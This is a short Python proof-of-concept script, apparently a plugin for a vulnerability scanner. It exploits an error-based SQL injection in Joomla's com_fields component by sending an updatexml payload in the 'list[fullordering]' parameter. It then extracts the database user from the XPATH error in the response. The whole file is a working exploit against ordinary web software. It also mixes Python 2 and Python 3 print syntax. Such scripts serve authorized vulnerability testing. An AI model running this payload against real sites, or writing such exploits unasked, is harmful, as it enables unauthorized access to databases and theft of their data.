from lib.core.data import target
import requests
import re

def poc():
	try:
		if  not target.url.endswith("index.php"):
			print("[*] Please make sure the url end with 'index.php'")
			exit()

		# sql inject
		payload = {
			"option":"com_fields",
			"view":"fields",
			"layout":"modal",
			"list[fullordering]":"updatexml(0x23,concat(1,user()),1)"
		}
		r = requests.get(target.url,params=payload)
		print "[*] The Paylaod: " + "updatexml(0x23,concat(1,user()),1)"

		# get data
		p = re.compile("(?<=XPATH syntax error: &#039;)(.*)(?=&#039)")
		s = re.search(p,r.text)
		if s:
			userdata = s.group(0)
			print "[*] Get the User: " + userdata
			print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
		else:
			raise KeyError
	except KeyError as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
